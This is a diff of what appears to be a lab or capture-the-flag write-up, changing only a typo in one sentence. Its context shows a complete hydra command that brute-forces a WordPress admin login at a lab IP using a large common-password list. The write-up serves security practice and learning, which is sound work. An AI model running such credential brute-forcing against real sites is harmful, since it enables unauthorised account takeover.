@@ -92,7 +92,7 @@ Command to run:
 hydra -l admin -P ./../SecLists-2021.2/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.10.10.29 http-form-post "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.10.29%2Fwordpress%2Fwp-admin%2F&testcookie=1:ERROR"
 ```
 
-This was fabricated from the examining the requests through both Dev Tools and Burp. I am not %100 sure about the `ERROR` part however.
+This was fabricated from examining the requests through both Dev Tools and Burp. I am not %100 sure about the `ERROR` part however.
 
 ---
 
